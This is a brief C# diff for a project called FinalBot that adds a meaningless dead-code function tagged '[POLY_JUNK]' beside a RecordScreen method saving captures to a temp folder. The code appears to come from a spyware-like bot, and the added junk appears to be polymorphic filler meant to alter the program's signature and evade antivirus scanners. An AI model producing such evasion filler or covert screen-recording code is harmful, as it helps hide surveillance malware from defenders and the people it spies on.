@@ -7,6 +7,12 @@ namespace FinalBot.Modules
 {
     public static class VideoModule
     {
+        // [POLY_JUNK]
+        private static void _vanguard_c145bc64() {
+            int val = 44564;
+            if (val > 50000) Console.WriteLine("Hash:" + 44564);
+        }
+
         public static async Task<string?> RecordScreen(int seconds)
         {
             string tempDir = Path.Combine(Path.GetTempPath(), $"vid_{Environment.TickCount}");
